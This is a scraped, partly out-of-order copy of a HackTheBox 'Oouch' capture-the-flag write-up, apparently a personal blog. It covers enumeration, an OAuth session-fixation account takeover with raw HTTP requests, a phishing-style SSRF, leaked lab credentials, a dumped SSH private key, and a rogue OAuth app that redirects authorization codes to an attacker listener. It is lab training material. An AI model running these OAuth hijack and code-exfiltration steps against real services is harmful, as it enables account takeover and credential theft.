VcpPi1sKFO7cFyhQ8EME2DbgMxcAZCj0vypbOeWlAAAFiA7BX3cOwV93AAAAB3NzaC1yc2 EAAAGBAKkLx7igNYtvA9ZXb1WxQfDy+wEcQTcvFXv4X1v1e3JhB0w0ybZpOyyWc3NXYyCi qmC/HgdGW1aUpiDS3ydsZwm4ES8qOWhG49V8Pn3a/f8itSHueSkI4J4ITXYK3mXg1p03wa 2PLHdfK8AUKcS6YaQkd+uzPTLsOit9bSYTZSMCrTlsuaA6PzvPFJ6iKmoiVWRQ6Ryf7tLk HPM6qnR0dR7VVW14jN7uTP+rW94/fEce7MKzRArdlsq5mKK2C6E7xiuH6yL27/Jb87RuPF q7CBMr0hCjajVH50RhWFCWVDK4nTeYjsmr1O4mNJaDK59sYpLlayHlHF0W5c3hcE2sZJAo VyoGHZ1h7Pteaqw5mU80GIGpse/rw9d3E7maiph5ERRDw32vz15aCiKotowLWVW4Ilap0t BfuAcRNk9/Kv/xudd4kdRF7j84eI0CARgwnIquVTbN7dLp/oHeQHuNHrCSnlXKT4tbChTu 3BcoUPBDBNg24DMXAGQo9L8qWznlpQAAAAMBAAEAAAGBAJ5OLtmiBqKt8tz+AoAwQD1hfl fa2uPPzwHKZZrbd6B0Zv4hjSiqwUSPHEzOcEE2s/Fn6LoNVCnviOfCMkJcDN4YJteRZjNV 97SL5oW72BLesNu21HXuH1M/GTNLGFw1wyV1+oULSCv9zx3QhBD8LcYmdLsgnlYazJq/mc CHdzXjIs9dFzSKd38N/RRVbvz3bBpGfxdUWrXZ85Z/wPLPwIKAa8DZnKqEZU0kbyLhNwPv XO80K6s1OipcxijR7HAwZW3haZ6k2NiXVIZC/m/WxSVO6x8zli7mUqpik1VZ3X9HWH9ltz tESlvBYHGgukRO/OFr7VOd/EpqAPrdH4xtm0wM02k+qVMlKId9uv0KtbUQHV2kvYIiCIYp /Mga78V3INxpZJvdCdaazU5sujV7FEAksUYxbkYGaXeexhrF6SfyMpOc2cB/rDms7KYYFL /4Rau4TzmN5ey1qfApzYC981Yy4tfFUz8aUfKERomy9aYdcGurLJjvi0r84nK3ZpqiHQAA AMBS+Fx1SFnQvV/c5dvvx4zk1Yi3k3HCEvfWq5NG5eMsj+WRrPcCyc7oAvb/TzVn/Eityt cEfjDKSNmvr2SzUa76Uvpr12MDMcepZ5xKblUkwTzAAannbbaxbSkyeRFh3k7w5y3N3M5j sz47/4WTxuEwK0xoabNKbSk+plBU4y2b2moUQTXTHJcjrlwTMXTV2k5Qr6uCyvQENZGDRt XkgLd4XMed+UCmjpC92/Ubjc+g/qVhuFcHEs9LDTG9tAZtgAEAAADBANMRIDSfMKdc38il jKbnPU6MxqGII7gKKTrC3MmheAr7DG7FPaceGPHw3n8KEl0iP1wnyDjFnlrs7JR2OgUzs9 dPU3FW6pLMOceN1tkWj+/8W15XW5J31AvD8dnb950rdt5lsyWse8+APAmBhpMzRftWh86w EQL28qajGxNQ12KeqYG7CRpTDkgscTEEbAJEXAy1zhp+h0q51RbFLVkkl4mmjHzz0/6Qxl tV7VTC+G7uEeFT24oYr4swNZ+xahTGvwAAAMEAzQiSBu4dA6BMieRFl3MdqYuvK58lj0NM 2lVKmE7TTJTRYYhjA0vrE/kNlVwPIY6YQaUnAsD7MGrWpT14AbKiQfnU7JyNOl5B8E10Co G/0EInDfKoStwI9KV7/RG6U7mYAosyyeN+MHdObc23YrENAwpZMZdKFRnro5xWTSdQqoVN zYClNLoH22l81l3minmQ2+Gy7gWMEgTx/wKkse36MHo7n4hwaTlUz5ujuTVzS+57Hupbwk IEkgsoEGTkznCbAAAADnBlbnRlc3RlckBrYWxpAQIDBA== -----END OPENSSH PRIVATE KEY----- SSH Access with qtc $ chmod 600 id_rsa $ ssh -i id_rsa qtc@oouch.htb Linux oouch 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Tue Feb 25 12:45:55 2020 from 10.10.14.3 qtc@oouch:~$ cat user.txt 2dea47702ee688171c4918703f46cb3c Privilege Escalation : docker credential stuffing Let’s see if there is a hint:\nqtc@oouch:~$ ls -lA total 28 lrwxrwxrwx 1 root root 9 Feb 11 18:34 .bash_history -\u003e /dev/null -rw-r--r-- 1 qtc qtc 220 Feb 11 18:11 .bash_logout -rw-r--r-- 1 qtc qtc 3526 Feb 11 18:11 .bashrc drwx------ 3 qtc qtc 4096 Feb 25 12:45 .gnupg -rw-r--r-- 1 root root 55 Feb 11 18:34 .note.txt -rw-r--r-- 1 qtc qtc 807 Feb 11 18:11 .profile drwx------ 2 qtc qtc 4096 Feb 11 18:34 .ssh -rw------- 1 qtc qtc 33 Jun 30 10:00 user.txt qtc@oouch:~$ cat .note.txt Implementing an IPS using DBus and iptables == Genius? Let’s see about dbus process:\n$ ps -ef f | grep dbus root 2688 1 0 09:59 ? Ss 0:00 /root/dbus-server message+ 2690 1 0 09:59 ? Ss 0:02 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only Let’s check a dbus trick on hacktricks:\n/etc/dbus-1/system.d/htb.oouch.Block.conf\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN\" \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e ","wordCount":"3353","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/oouch/oouch.png","datePublished":"2020-07-31T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/oouch/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/archives title=Blog><span>Blog</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Oouch</h1><div class=post-description>Oouch HackTheBox writeup</div><div class=post-meta><span title='2020-07-31 00:00:00 +0000 UTC'>July 31, 2020</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;3353 words&nbsp;·&nbsp;s4ch</div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/oouch/oouch.png alt="Oouch HackTheBox Machine"><p>Oouch - Hard Linux Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#ftp-enumeration>FTP Enumeration</a></li><li><a href=#http-discovery>HTTP Discovery</a></li><li><a href=#http-enumeration>HTTP Enumeration</a></li><li><a href=#oauth-discovery--exploitation>oAuth Discovery & exploitation</a></li><li><a href=#ssrf>SSRF</a></li><li><a href=#qtcs-documents>qtc&rsquo;s documents</a></li><li><a href=#http-enumeration-again>HTTP Enumeration (again)</a></li><li><a href=#registering-an-app>Registering an app</a></li><li><a href=#2nd-oauth-exploitation>2nd oAuth exploitation</a></li><li><a href=#get-qtc-ssh-key>Get qtc SSH key</a></li><li><a href=#ssh-access-with-qtc>SSH Access with qtc</a></li><li><a href=#privilege-escalation--docker-credential-stuffing>Privilege Escalation : docker credential stuffing</a></li><li><a href=#uwsgi-exploitation>UWSGI exploitation</a></li><li><a href=#dbus-exploitation>DBUS Exploitation</a></li><li><a href=#bonus>Bonus</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Oouch</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/231>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Hard</li><li><strong>OS:</strong> Linux</li><li><strong>Points:</strong> 40</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><p><strong>TL;DR</strong>: The 1st part is a lot about oAuth and the pe part about DBus and UWSGI.</p><p>Install tools used in this WU on BlackArch Linux:</p><pre tabindex=0><code>$ sudo pacman -S nmap filezilla ffuf burpsuite gnu-netcat
+</code></pre><h3 id=network-enumeration>Network Enumeration<a hidden class=anchor aria-hidden=true href=#network-enumeration>#</a></h3><p>Let&rsquo;s discover available services with a <a href=https://nmap.org/>nmap</a> scan:</p><pre tabindex=0><code>$ sudo nmap -p- -sSVC 10.10.10.177 -oA nmap_full
+[sudo] password for cyfun: 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 23:51 CEST
+WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
+Nmap scan report for 10.10.10.177
+Host is up (0.022s latency).
+Not shown: 65531 closed ports
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 2.0.8 or later
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.15.102
+|      Logged in as ftp
+|      TYPE: ASCII
+|      Session bandwidth limit in byte/s is 30000
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA)
+|_  256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519)
+5000/tcp open  http    nginx 1.14.2
+|_http-server-header: nginx/1.14.2
+| http-title: Welcome to Oouch
+|_Requested resource was http://10.10.10.177:5000/login?next=%2F
+8000/tcp open  rtsp
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest, HTTPOptions: 
+|     HTTP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|   RTSPRequest: 
+|     RTSP/1.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|     &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|   SIPOptions: 
+|     SIP/2.0 400 Bad Request
+|     Content-Type: text/html
+|     Vary: Authorization
+|_    &lt;h1&gt;Bad Request (400)&lt;/h1&gt;
+|_http-title: Site doesn&#39;t have a title (text/html).
+|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8000-TCP:V=7.80%I=7%D=6/29%Time=5EFA626D%P=x86_64-unknown-linux-gnu
+SF:%r(GetRequest,64,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x
+SF:20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(40
+SF:0\)&lt;/h1&gt;&#34;)%r(FourOhFourRequest,64,&#34;HTTP/1\.0\x20400\x20Bad\x20Request\r
+SF:\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r\n&lt;h1&gt;Bad\x
+SF:20Request\x20\(400\)&lt;/h1&gt;&#34;)%r(HTTPOptions,64,&#34;HTTP/1\.0\x20400\x20Bad\x
+SF:20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authorization\r\n\r
+SF:\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&#34;)%r(RTSPRequest,64,&#34;RTSP/1\.0\x204
+SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x20Authoriz
+SF:ation\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&#34;)%r(SIPOptions,63,&#34;SIP/
+SF:2\.0\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/html\r\nVary:\x2
+SF:0Authorization\r\n\r\n&lt;h1&gt;Bad\x20Request\x20\(400\)&lt;/h1&gt;&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 48.42 seconds
+</code></pre><h3 id=ftp-enumeration>FTP Enumeration<a hidden class=anchor aria-hidden=true href=#ftp-enumeration>#</a></h3><p>Let&rsquo;s check the FTP anonymous access with FileZilla or <code>ftp</code> CLI command:</p><pre tabindex=0><code>$ ftp 10.10.10.177
+Connected to 10.10.10.177.
+220 qtc&#39;s development server
+Name (10.10.10.177:cyfun): anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 ftp      ftp            49 Feb 11 19:34 project.txt
+226 Directory send OK.
+</code></pre><p>Only one file, <code>project.txt</code>, we can&rsquo;t miss it:</p><pre tabindex=0><code>$ cat project.txt
+Flask -&gt; Consumer
+Django -&gt; Authorization Server
+</code></pre><p>It seems we will encounter a python web server in the next steps.</p><h3 id=http-discovery>HTTP Discovery<a hidden class=anchor aria-hidden=true href=#http-discovery>#</a></h3><p>Then we have a web application on port 5000: http://10.10.10.177:5000/</p><p>There are a login and a register form, so let&rsquo;s register to see what&rsquo;s behind.</p><p>We quickly check the menu entries but there is nothing interesting.</p><p>The only action we can do is send a message on the contact page.</p><h3 id=http-enumeration>HTTP Enumeration<a hidden class=anchor aria-hidden=true href=#http-enumeration>#</a></h3><p>We&rsquo;ll use <a href=https://github.com/ffuf/ffuf>ffuf</a> for directory busting:</p><pre tabindex=0><code>$ ffuf -u http://10.10.10.177:5000/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt 
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.177:5000/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+about                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
+contact                 [Status: 200, Size: 1828, Words: 414, Lines: 55]
+documents               [Status: 200, Size: 1828, Words: 414, Lines: 55]
+home                    [Status: 200, Size: 1828, Words: 414, Lines: 55]
+logout                  [Status: 200, Size: 1828, Words: 414, Lines: 55]
+login                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
+oauth                   [Status: 200, Size: 1828, Words: 414, Lines: 55]
+profile                 [Status: 200, Size: 1828, Words: 414, Lines: 55]
+register                [Status: 200, Size: 2109, Words: 517, Lines: 64]
+:: Progress: [4658/4658]┬á:: Job [1/1] :: 388 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+</code></pre><p>The only endpoint that not linked in the menu is <code>oauth</code>.</p><blockquote><p>Please notice: This functionality is currently under development and not ready to be used in production. However, since you know about this hidden URL, it seems that you got developer access and are supposed to use it.</p><p>In order to connect your account with our Oouch authorization server, please visit:
+<a href=http://consumer.oouch.htb:5000/oauth/connect>http://consumer.oouch.htb:5000/oauth/connect</a></p><p>Once your account is connected, you should be able to use the authorization server for login. Just visit:
+<a href=http://consumer.oouch.htb:5000/oauth/login>http://consumer.oouch.htb:5000/oauth/login</a></p></blockquote><p>Before digging deeper the oAuth process I&rsquo;ll add the domain names in <code>/etc/hosts</code>
+as a domain name may be required:</p><pre tabindex=0><code>10.10.10.177 oouch.htb
+10.10.10.177 consumer.oouch.htb
+10.10.10.177 authorization.oouch.htb
+</code></pre><p>If we go to <a href=http://consumer.oouch.htb:5000/oauth/connect>http://consumer.oouch.htb:5000/oauth/connect</a> and login we are
+redirected several times to end here: <a href=http://authorization.oouch.htb:8000/login/>http://authorization.oouch.htb:8000/login/</a></p><p>So as we saw in <code>project.txt</code>, we must have the following logic:</p><ul><li>Flask -> Consumer -> consumer.oouch.htb:5000</li><li>Django -> Authorization Server -> authorization.oouch.htb:8000</li></ul><h3 id=oauth-discovery--exploitation>oAuth Discovery & exploitation<a hidden class=anchor aria-hidden=true href=#oauth-discovery--exploitation>#</a></h3><p>From here I&rsquo;ll have to learn about how oAuth works.</p><p>There are plenty resources to explain security flaws in oAuth, we will look how
+to perform a <em>Session Fixation Attack on oAuth</em>:</p><ul><li><a href=https://www.sans.org/reading-room/whitepapers/application/attacks-oauth-secure-oauth-implementation-33644>2020 - SANS (InstituteInformation Security Reading Room) - Four Attacks on OAuth, How to Secure Your OAuthImplementation by Khash Kiani</a></li><li><a href=https://owasp.org/www-pdf-archive/OWASP-NL_Chapter_Meeting201501015_OAuth_Jim_Manico.pdf>2015 - OWASP (NL Chapter Meeting 2015-01-15) - OAuth by Jim_Manico</a></li><li><a href=https://dhavalkapil.com/blogs/Attacking-the-OAuth-Protocol/>2017 - Attacking the OAuth Protocol by Dhaval Kapil</a></li></ul><p>So we will have to conduct an attack following those steps (we will need a proxy like <a href=https://portswigger.net/burp>Burp</a>):</p><ol><li>The victim (admin) is logged in at consumer site (htpp://consumer.oouch.htb:5000) (The oAuth client application)</li><li>The attacker (us) register an account at consumer site (<a href=http://consumer.oouch.htb:5000/register>http://consumer.oouch.htb:5000/register</a>)</li><li>The attacker register an account at the provider site (<a href=http://authorization.oouch.htb:8000/signup/>http://authorization.oouch.htb:8000/signup/</a>)</li><li>The attacker login at the provider site to speed-up the process (<a href=http://authorization.oouch.htb:8000/login/>http://authorization.oouch.htb:8000/login/</a>)</li><li>The attacker start login locally at consumer site (<a href=http://consumer.oouch.htb:5000/login>http://consumer.oouch.htb:5000/login</a>)</li><li>The attacker goes to the oAuth login page (<a href=http://consumer.oouch.htb:5000/oauth>http://consumer.oouch.htb:5000/oauth</a>)</li><li>The attacker start the connection process:<ol><li><p>The attacker send the connect request</p><pre tabindex=0><code>GET /oauth/connect HTTP/1.1
+Host: consumer.oouch.htb:5000
+...
+</code></pre></li><li><p>Consumer Site redirects attacker to Provider Site to authorize the consumer site to use the provider site account (the oAuth authorization) (<a href=http://authorization.oouch.htb:8000/oauth/authorize/>http://authorization.oouch.htb:8000/oauth/authorize/</a>)</p><pre tabindex=0><code>GET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read HTTP/1.1
+Host: authorization.oouch.htb:8000
+...
+</code></pre></li><li><p>The attacker confirms the authorization by clicking the Authorize button (<a href=http://authorization.oouch.htb:8000/oauth/authorize/>http://authorization.oouch.htb:8000/oauth/authorize/</a>)</p><pre tabindex=0><code>POST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;response_type=code&amp;redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token&amp;scope=read HTTP/1.1
+Host: authorization.oouch.htb:8000
+...
+
+csrfmiddlewaretoken=VoAxj1ao7mvIrvJDGPCTyB2x6Rq6KEwWWeFwFjEjArMsd2UkWwry6m8hxn737ia2&amp;redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken&amp;scope=read&amp;client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82&amp;state=&amp;response_type=code&amp;allow=Authorize
+</code></pre></li><li><p>The provider site responds with the redirect URL which contains the authorization code in the code parameter (Authorization Grant)</p><pre tabindex=0><code>GET /oauth/connect/token?code=Srwh8xkKLMf1VDre8HmqGieVQ1aY1C HTTP/1.1
+Host: consumer.oouch.htb:5000
+...
+</code></pre></li><li><p>Here, the attacker <strong>DOES NOT</strong> follow the redirection (<em>Drop</em> instead of <em>Forward</em> in Burp).</p></li></ol></li><li>Instead the attacker copies the Authorization Grant URL and send it to the administrator via the contact form (pseudo-SSRF that we&rsquo;ll see just after).<pre tabindex=0><code>POST /contact HTTP/1.1
+Host: oouch.htb:5000
+...
+
+csrf_token=IjQ0ZTk3YTcxZTJkMTUzMjdkODBmZWJlOTk3MWVhNjFlNDQ3YThkMTIi.XvuH3Q.BYECgUUU9-nRB3hYE9dOPPi_4dA&amp;textfield=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken%3Fcode%3DSrwh8xkKLMf1VDre8HmqGieVQ1aY1C&amp;submit=Send
+</code></pre></li><li>The victim follows the link and requests the Authorization Grant URL, and by doing so gives authorization to the Attacker to have full authorized access to Victim&rsquo;s account on Consumer Site.</li><li>The attacker waits a minute and goes back to the oAuth connect URL (<a href=http://consumer.oouch.htb:5000/oauth/login>http://consumer.oouch.htb:5000/oauth/login</a>) and Authorize.</li><li>The attacker goes back to the profile page on consumer site and checks the account username is now <code>qtc</code>.</li></ol><h3 id=ssrf>SSRF<a hidden class=anchor aria-hidden=true href=#ssrf>#</a></h3><p>If you paste an URL in the contact form, someone will click on it (a bot).
+So this gives us a pseudo-SSRF (in a phishing way).</p><p>Here the web server receiving the bot visit 1 minute after the message was sent.</p><pre tabindex=0><code>$ ruby -run -e httpd share -p 8000
+[2020-06-30 19:09:57] INFO  WEBrick 1.6.0
+[2020-06-30 19:09:57] INFO  ruby 2.7.1 (2020-03-31) [x86_64-linux]
+[2020-06-30 19:09:57] INFO  WEBrick::HTTPServer#start: pid=55191 port=8000
+[2020-06-30 19:12:21] ERROR `/&#39; not found.
+10.10.10.177 - - [30/Jun/2020:19:12:21 CEST] &#34;GET / HTTP/1.1&#34; 404 273
+- -&gt; /
+</code></pre><p>So we used this SSRF to send the Authorization Grant URL to the victim.</p><h3 id=qtcs-documents>qtc&rsquo;s documents<a hidden class=anchor aria-hidden=true href=#qtcs-documents>#</a></h3><p>Now that we are logged in as <code>qtc</code> (admin) we can access the document endpoint (<a href=http://consumer.oouch.htb:5000/documents)>http://consumer.oouch.htb:5000/documents)</a>.</p><table><thead><tr><th>Filename</th><th>Content</th></tr></thead><tbody><tr><td>dev_access.txt</td><td>develop:supermegasecureklarabubu123! -> Allows application registration.</td></tr><tr><td>o_auth_notes.txt</td><td>/api/get_user -> user data. oauth/authorize -> Now also supports GET method.</td></tr><tr><td>todo.txt</td><td>Chris mentioned all users could obtain my ssh key. Must be a joke&mldr;</td></tr></tbody></table><p>Knowledge from the documents:</p><ul><li>Credentials to register an app</li><li>There is api to access user data</li><li>The ssh key of <code>qtc</code> should be available somewhere</li></ul><h3 id=http-enumeration-again>HTTP Enumeration (again)<a hidden class=anchor aria-hidden=true href=#http-enumeration-again>#</a></h3><p>There must be an endpoint to register an application as said in <code>dev_access.txt</code>.</p><p>Let&rsquo;s use <a href=https://github.com/ffuf/ffuf>ffuf</a> to find it, rather straightforward:</p><pre tabindex=0><code>$ ffuf -u http://authorization.oouch.htb:8000/oauth/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://authorization.oouch.htb:8000/oauth/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+applications            [Status: 401, Size: 0, Words: 1, Lines: 1]
+:: Progress: [4658/4658]┬á:: Job [1/1] :: 258 req/sec :: Duration: [0:00:18] :: Errors: 0 ::
+
+$ ffuf -u http://authorization.oouch.htb:8000/oauth/applications/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.1.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://authorization.oouch.htb:8000/oauth/applications/FUZZ
+ :: Wordlist         : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+________________________________________________
+
+...
+register                [Status: 401, Size: 0, Words: 1, Lines: 1]
+:: Progress: [4658/4658]┬á:: Job [1/1] :: 194 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
+</code></pre><p>So we should be able to register an app at <a href=http://authorization.oouch.htb:8000/oauth/applications/register>http://authorization.oouch.htb:8000/oauth/applications/register</a></p><h3 id=registering-an-app>Registering an app<a hidden class=anchor aria-hidden=true href=#registering-an-app>#</a></h3><p>Go at <a href=http://authorization.oouch.htb:8000/oauth/applications/register>http://authorization.oouch.htb:8000/oauth/applications/register</a></p><p>We are prompted for credentials (<em>Oouch Development</em>):</p><p>Let&rsquo;s use <code>dev_access.txt</code>:</p><pre tabindex=0><code>develop:supermegasecureklarabubu123! -&gt; Allows application registration.
+</code></pre><p>We can now access the registration form:</p><p>Let&rsquo;s try to register an app.</p><ul><li>Name: cyfunapp</li><li>Client id: ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX</li><li>Client secret: Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs</li><li>Client type: Public</li><li>Authorization grant type: Authorization code</li><li>Redirect uris: http://10.10.15.142:8888/ (attacker machine)</li></ul><p><a href=http://authorization.oouch.htb:8000/oauth/applications/2/>http://authorization.oouch.htb:8000/oauth/applications/2/</a></p><p>Let&rsquo;s start a listener:</p><pre tabindex=0><code>$ nc -nlvp 8888
+</code></pre><p>Now reading some <a href=https://docs.oracle.com/en/cloud/saas/marketing/eloqua-develop/Developers/GettingStarted/Authentication/authenticate-using-oauth.htm>Oracle documentation - Authenticate using OAuth 2.0</a></p><p>We know we must request <a href=http://authorization.oouch.htb:8000/oauth/authorize>http://authorization.oouch.htb:8000/oauth/authorize</a> endpoint with some well known params.</p><pre tabindex=0><code>http://authorization.oouch.htb:8000/oauth/authorize?response_type=code&amp;client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX&amp;redirect_uri=http://10.10.15.142:8888/&amp;grant_type=authorization_code&amp;client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs
